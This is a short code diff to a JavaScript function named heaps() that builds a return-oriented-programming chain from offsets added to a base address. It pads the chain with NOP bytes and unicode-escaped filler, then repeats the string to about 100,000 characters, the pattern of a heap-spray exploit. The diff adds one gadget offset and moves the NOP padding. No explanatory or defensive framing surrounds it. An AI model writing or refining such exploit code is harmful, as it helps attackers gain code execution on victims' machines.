@@ -49,6 +49,7 @@ function heaps() {
           base + 0xB8D8,   
           base + 0x4F87,   
           base + 0x11EB1,  
+          base + 0x6C0A,
           base + 0x38C81
          ];
 
@@ -79,13 +80,13 @@ function heaps() {
              w2a(rops[18].toString(16)) +
              w2a('ffffffc0')          +
              w2a(rops[19].toString(16)) +
-             w2a('90909090')          +
              w2a(rops[20].toString(16)) +
+             w2a('90909090')          +
+             w2a(rops[21].toString(16)) +
              unescape('%u0a4c%u0a0a') + 
              unescape('%ueeee%ueeee') +
              unescape('%ucccc%ucccc') +   
              unescape('%ufefe%ufefe');  
-//nop shell
 
     while (code.length < 100000)
         code = code + code;
